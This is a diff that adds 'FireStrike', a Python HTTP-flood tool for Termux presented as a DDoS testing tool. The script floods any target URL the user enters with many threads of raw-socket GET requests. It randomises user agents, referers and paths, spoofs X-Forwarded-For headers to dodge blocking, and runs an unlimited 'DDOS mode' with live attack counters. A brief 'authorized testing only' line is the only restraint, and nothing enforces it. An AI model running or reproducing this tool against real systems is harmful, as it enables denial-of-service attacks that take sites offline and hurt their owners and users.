@@ -1,0 +1,532 @@
+---
+
+### firestrike.py
+
+```python
+#!/usr/bin/env python3
+"""
+FireStrike - Termux DDoS Testing Tool
+Author: zaid.escamillaa (Instagram)
+
+For authorized penetration testing only.
+"""
+
+import socket
+import ssl
+import threading
+import random
+import time
+import sys
+import os
+from datetime import datetime
+from urllib.parse import urlparse
+
+# Try to import optional colored output
+try:
+    from colorama import init, Fore, Style
+    init()
+    COLORS = True
+except ImportError:
+    COLORS = False
+
+# Try for fancy banner
+try:
+    import pyfiglet
+    FIGLET = True
+except ImportError:
+    FIGLET = False
+
+# --- Globals ---
+ATTACK_RUNNING = False
+REQUESTS_SENT = 0
+TOTAL_REQUESTS = 0
+REQUEST_LOCK = threading.Lock()
+MAX_THREADS = 200  # Termux-friendly default
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "PostmanRuntime/7.36.0",
+    "curl/8.4.0",
+    "Python-urllib/3.11",
+    "Go-http-client/2.0",
+]
+
+PATHS = [
+    "/", "/index.html", "/index.php", "/home", "/about", "/contact",
+    "/login", "/admin", "/wp-admin", "/wp-login.php", "/api/v1/",
+    "/api/status", "/api/health", "/api/users", "/api/data",
+    "/assets/", "/css/", "/js/", "/images/", "/favicon.ico",
+    "/robots.txt", "/sitemap.xml", "/.env", "/config.php",
+    "/server-status", "/phpinfo.php", "/test.php",
+    "/search", "/register", "/signup", "/dashboard", "/profile",
+]
+
+REFERERS = [
+    "https://www.google.com/",
+    "https://www.facebook.com/",
+    "https://twitter.com/",
+    "https://www.reddit.com/",
+    "https://www.bing.com/",
+    "https://www.yahoo.com/",
+    "https://www.instagram.com/",
+    "https://www.linkedin.com/",
+    "https://www.youtube.com/",
+    "https://t.co/",
+    "",
+]
+
+
+def c(text, color_code="", bold=False):
+    """Colorize text if colorama is available."""
+    if COLORS:
+        return f"{color_code}{text}{Style.RESET_ALL}"
+    return text
+
+
+def red(text):
+    return c(text, Fore.RED)
+
+
+def green(text):
+    return c(text, Fore.GREEN)
+
+
+def yellow(text):
+    return c(text, Fore.YELLOW)
+
+
+def cyan(text):
+    return c(text, Fore.CYAN)
+
+
+def magenta(text):
+    return c(text, Fore.MAGENTA)
+
+
+def white(text):
+    return c(text, Fore.WHITE)
+
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+
+def show_banner():
+    """Display the fancy banner."""
+    clear_screen()
+    
+    if FIGLET:
+        banner = pyfiglet.figlet_format("FireStrike", font="slant")
+    else:
+        banner = """
+    ╔═══════════════════════════════════════════╗
+    ║              F  I  R  E  S  T  R  I  K  E ║
+    ║         Termux DDoS Testing Tool          ║
+    ╚═══════════════════════════════════════════╝
+    """
+    
+    print(red(banner))
+    print(cyan("═" * 50))
+    print(f"{yellow('🔥 Author')}: {white('zaid.escamillaa')} {yellow('(Instagram)')}")
+    print(f"{yellow('🔥 Mode')}:   {white('DOS / DDOS Stress Testing')}")
+    print(f"{yellow('🔥 Legal')}:  {red('Authorized Testing Only')}")
+    print(cyan("═" * 50))
+    print()
+
+
+def show_credits():
+    """Display credits screen."""
+    clear_screen()
+    print()
+    print(red("═" * 50))
+    print()
+    print(red("  ███████████████████████████████████████████████████"))
+    print(red("  ██                                               ██"))
+    print(red("  ██") + white("           FIRESTRIKE - DDoS Tool           ") + red("██"))
+    print(red("  ██                                               ██"))
+    print(red("  ██") + yellow("           Created by: zaid.escamillaa        ") + red("██"))
+    print(red("  ██") + yellow("           Instagram: @zaid.escamillaa        ") + red("██"))
+    print(red("  ██                                               ██"))
+    print(red("  ██") + cyan("     For authorized penetration testing        ") + red("██"))
+    print(red("  ██") + cyan("     only. Unauthorized use is illegal.        ") + red("██"))
+    print(red("  ██                                               ██"))
+    print(red("  ███████████████████████████████████████████████████"))
+    print()
+    print(cyan("═" * 50))
+    print()
+    input(white("  Press Enter to return to menu..."))
+
+
+def get_target():
+    """Prompt user for target URL and parse it."""
+    print()
+    target_input = input(f"{cyan('[?] Enter target URL: ')}{white()}")
+    
+    if not target_input:
+        print(red("[-] No target entered!"))
+        return None, None, None
+    
+    # Add scheme if missing
+    if not target_input.startswith(("http://", "https://")):
+        target_input = "http://" + target_input
+    
+    try:
+        parsed = urlparse(target_input)
+        host = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        path = parsed.path or "/"
+        use_ssl = parsed.scheme == "https"
+        
+        print(green(f"[+] Target resolved: {host}:{port} (SSL: {use_ssl})"))
+        return host, port, use_ssl
+    except Exception as e:
+        print(red(f"[-] Invalid URL: {e}"))
+        return None, None, None
+
+
+def get_request_count():
+    """Get number of requests to send."""
+    print()
+    while True:
+        try:
+            count = input(f"{cyan('[?] Number of requests to send (0 = infinite): ')}{white()}")
+            count = int(count) if count else 0
+            if count < 0:
+                print(red("[-] Enter a positive number or 0 for infinite."))
+                continue
+            return count
+        except ValueError:
+            print(red("[-] Invalid number!"))
+
+
+def get_thread_count():
+    """Get number of threads to use."""
+    print()
+    while True:
+        try:
+            threads = input(f"{cyan('[?] Threads (1-500, default 200): ')}{white()}")
+            threads = int(threads) if threads else 200
+            if threads < 1:
+                threads = 1
+            if threads > 500:
+                print(yellow("[!] Capping at 500 threads for stability."))
+                threads = 500
+            return threads
+        except ValueError:
+            print(red("[-] Invalid number!"))
+
+
+def build_http_request(host, path, use_ssl):
+    """Build a raw HTTP request string."""
+    user_agent = random.choice(USER_AGENTS)
+    referer = random.choice(REFERERS)
+    xff = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+    
+    request = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"User-Agent: {user_agent}\r\n"
+        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+        f"Accept-Language: en-US,en;q=0.5\r\n"
+        f"Accept-Encoding: gzip, deflate, br\r\n"
+        f"Referer: {referer}\r\n"
+        f"X-Forwarded-For: {xff}\r\n"
+        f"X-Real-IP: {xff}\r\n"
+        f"Connection: keep-alive\r\n"
+        f"Cache-Control: no-cache\r\n"
+        f"Pragma: no-cache\r\n"
+        f"\r\n"
+    )
+    return request.encode()
+
+
+def send_request(host, port, path, use_ssl):
+    """Send a single HTTP request using raw sockets."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        
+        # Connect
+        if use_ssl:
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            sock = context.wrap_socket(sock, server_hostname=host)
+        
+        sock.connect((host, port))
+        
+        # Send request
+        request = build_http_request(host, path, use_ssl)
+        sock.send(request)
+        
+        # Read response (optional, but helps complete TCP handshake fully)
+        try:
+            sock.recv(1024)
+        except:
+            pass
+        
+        sock.close()
+        return True
+    except:
+        try:
+            sock.close()
+        except:
+            pass
+        return False
+
+
+def attack_worker(host, port, use_ssl):
+    """Thread worker that sends requests continuously."""
+    global REQUESTS_SENT, ATTACK_RUNNING, TOTAL_REQUESTS
+    
+    while ATTACK_RUNNING:
+        path = random.choice(PATHS)
+        success = send_request(host, port, path, use_ssl)
+        
+        with REQUEST_LOCK:
+            REQUESTS_SENT += 1
+            current = REQUESTS_SENT
+            
+            # Visual effect on every request
+            if success:
+                sys.stdout.write(f"\r{green('[✓]')} Attack sent! [{white(str(current))}] ")
+                sys.stdout.write(f"{cyan('⚡') * (current % 5 + 1)} ")
+            else:
+                sys.stdout.write(f"\r{red('[✗]')} Attack sent! [{white(str(current))}] ")
+                sys.stdout.write(f"{red('💥') * (current % 5 + 1)} ")
+            sys.stdout.flush()
+            
+            # Check if we've hit the limit
+            if TOTAL_REQUESTS > 0 and current >= TOTAL_REQUESTS:
+                ATTACK_RUNNING = False
+                break
+
+
+def counter_display(host):
+    """Display real-time counter with effects."""
+    global REQUESTS_SENT, ATTACK_RUNNING
+    
+    start_time = time.time()
+    last_count = 0
+    
+    while ATTACK_RUNNING:
+        time.sleep(1)
+        elapsed = time.time() - start_time
+        current = REQUESTS_SENT
+        
+        if elapsed > 0:
+            rps = (current - last_count)
+        
+        print()
+        print(f"  {cyan('╔══════════════════════════════════════╗')}")
+        print(f"  {cyan('║')}  {yellow('TARGET')}:        {white(host):<30} {cyan('║')}")
+        print(f"  {cyan('║')}  {yellow('REQUESTS')}:      {white(str(current)):<30} {cyan('║')}")
+        print(f"  {cyan('║')}  {yellow('RATE')}:         {white(str(rps) + ' req/s'):<30} {cyan('║')}")
+        print(f"  {cyan('║')}  {yellow('ELAPSED')}:     {white(str(int(elapsed)) + 's'):<30} {cyan('║')}")
+        
+        if TOTAL_REQUESTS > 0:
+            pct = min(100, int((current / TOTAL_REQUESTS) * 100))
+            bar = "█" * (pct // 4) + "░" * (25 - pct // 4)
+            print(f"  {cyan('║')}  {yellow('PROGRESS')}:   {cyan('[')}{white(bar)}{cyan(']')} {white(str(pct) + '%')}  {cyan('║')}")
+        
+        print(f"  {cyan('╚══════════════════════════════════════╝')}")
+        
+        if not ATTACK_RUNNING:
+            break
+
+
+def dos_attack(host, port, use_ssl):
+    """DOS mode - single source, single connection stream flood."""
+    global ATTACK_RUNNING, REQUESTS_SENT, TOTAL_REQUESTS, MAX_THREADS
+    
+    REQUESTS_SENT = 0
+    ATTACK_RUNNING = True
+    TOTAL_REQUESTS = get_request_count()
+    threads_count = get_thread_count()
+    MAX_THREADS = threads_count
+    
+    print()
+    print(yellow("  ┌────────────────────────────────────┐"))
+    print(yellow("  │") + red("        DOS MODE ENGAGED") + yellow("          │"))
+    print(yellow("  │") + white("     Single Source Flood") + yellow("         │"))
+    print(yellow("  └────────────────────────────────────┘"))
+    print()
+    print(cyan(f"  [*] Target: {host}:{port}"))
+    print(cyan(f"  [*] Threads: {threads_count}"))
+    print(cyan(f"  [*] Requests: {'Infinite' if TOTAL_REQUESTS == 0 else TOTAL_REQUESTS}"))
+    print(cyan(f"  [*] SSL: {use_ssl}"))
+    print()
+    print(red("  [!] Press Ctrl+C to stop the attack"))
+    print()
+    time.sleep(1)
+    
+    # Start counter thread
+    counter_thread = threading.Thread(target=counter_display, args=(host,))
+    counter_thread.daemon = True
+    counter_thread.start()
+    
+    # Start attack threads
+    threads = []
+    for i in range(threads_count):
+        t = threading.Thread(target=attack_worker, args=(host, port, use_ssl))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    try:
+        # Wait for all threads to complete (if limit set) or run forever
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        print()
+        print()
+        print(red("  [!] Attack stopped by user!"))
+    finally:
+        ATTACK_RUNNING = False
+    
+    print()
+    print(green(f"  [✓] Attack complete. Total requests sent: {REQUESTS_SENT}"))
+    input(white("  Press Enter to continue..."))
+
+
+def ddos_attack(host, port, use_ssl):
+    """DDOS mode - aggressive multi-threaded flood."""
+    global ATTACK_RUNNING, REQUESTS_SENT, TOTAL_REQUESTS, MAX_THREADS
+    
+    REQUESTS_SENT = 0
+    ATTACK_RUNNING = True
+    TOTAL_REQUESTS = get_request_count()
+    threads_count = get_thread_count()
+    MAX_THREADS = threads_count
+    
+    # Increase socket limit if possible
+    try:
+        import resource
+        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
+        if soft < 65535:
+            resource.setrlimit(resource.RLIMIT_NOFILE, (65535, hard))
+    except:
+        pass
+    
+    print()
+    print(yellow("  ┌────────────────────────────────────┐"))
+    print(yellow("  │") + red("       DDOS MODE ENGAGED") + yellow("         │"))
+    print(yellow("  │") + white("    Aggressive Multi-Thread Flood") + yellow(" │"))
+    print(yellow("  └────────────────────────────────────┘"))
+    print()
+    print(cyan(f"  [*] Target: {host}:{port}"))
+    print(cyan(f"  [*] Threads: {threads_count}"))
+    print(cyan(f"  [*] Requests: {'Infinite' if TOTAL_REQUESTS == 0 else TOTAL_REQUESTS}"))
+    print(cyan(f"  [*] SSL: {use_ssl}"))
+    print()
+    print(red("  [!] Press Ctrl+C to stop the attack"))
+    print()
+    time.sleep(1)
+    
+    # Start aggressive attack threads
+    threads = []
+    for i in range(threads_count):
+        t = threading.Thread(target=attack_worker, args=(host, port, use_ssl))
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    
+    # Start counter in main thread
+    start_time = time.time()
+    last_count = 0
+    
+    try:
+        while ATTACK_RUNNING:
+            time.sleep(0.5)
+            current = REQUESTS_SENT
+            
+            if TOTAL_REQUESTS > 0 and current >= TOTAL_REQUESTS:
+                ATTACK_RUNNING = False
+                break
+            
+            # Super aggressive visual every 0.5s
+            elapsed = time.time() - start_time
+            rps = int((current - last_count) / 0.5) if elapsed > 0 else 0
+            last_count = current
+            
+            # Flashy rotating effect
+            effects = ["💥", "🔥", "⚡", "💀", "🌀", "⚔️"]
+            effect = effects[current % len(effects)]
+            
+            sys.stdout.write(f"\r  {effect} {red('FIRESTRIKE')} {effect}  ")
+            sys.stdout.write(f"{green('►')} Requests: {white(str(current))}  ")
+            sys.stdout.write(f"{cyan('►')} Rate: {yellow(str(rps) + '/s')}  ")
+            sys.stdout.write(f"{magenta('►')} Elapsed: {cyan(str(int(elapsed)) + 's')}  ")
+            sys.stdout.write(f"{red('►')} Threads: {white(str(threads_count))}")
+            sys.stdout.flush()
+            
+            if not ATTACK_RUNNING:
+                break
+                
+    except KeyboardInterrupt:
+        print()
+        print()
+        print(red("  [!] Attack stopped by user!"))
+    finally:
+        ATTACK_RUNNING = False
+    
+    print()
+    print()
+    print(green(f"  [✓] DDOS Attack complete. Total requests sent: {REQUESTS_SENT}"))
+    input(white("  Press Enter to continue..."))
+
+
+def main_menu():
+    """Display main menu and handle user choice."""
+    while True:
+        show_banner()
+        
+        print(f"  {cyan('[1]')} {red('DOS MODE')}")
+        print(f"     {white('Single-source connection flood (test from one device)')}")
+        print()
+        print(f"  {cyan('[2]')} {red('DDOS MODE')}")
+        print(f"     {white('Aggressive multi-threaded flood (max connections)')}")
+        print()
+        print(f"  {cyan('[3]')} {yellow('CREDITS')}")
+        print(f"     {white('About the developer')}")
+        print()
+        print(f"  {cyan('[4]')} {yellow('EXIT')}")
+        print()
+        
+        choice = input(f"{cyan('[?] Select option (1-4): ')}{white()}")
+        
+        if choice == "1":
+            host, port, use_ssl = get_target()
+            if host:
+                dos_attack(host, port, use_ssl)
+        elif choice == "2":
+            host, port, use_ssl = get_target()
+            if host:
+                ddos_attack(host, port, use_ssl)
+        elif choice == "3":
+            show_credits()
+        elif choice == "4":
+            print(red("\n  [-] Exiting FireStrike..."))
+            print(cyan(f"  [-] Follow {white('@zaid.escamillaa')} {cyan('on Instagram')}"))
+            print()
+            sys.exit(0)
+        else:
+            print(red("  [-] Invalid option!"))
+            time.sleep(1)
+
+
+if __name__ == "__main__":
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print()
+        print(red("\n  [-] Exiting FireStrike..."))
+        sys.exit(0)
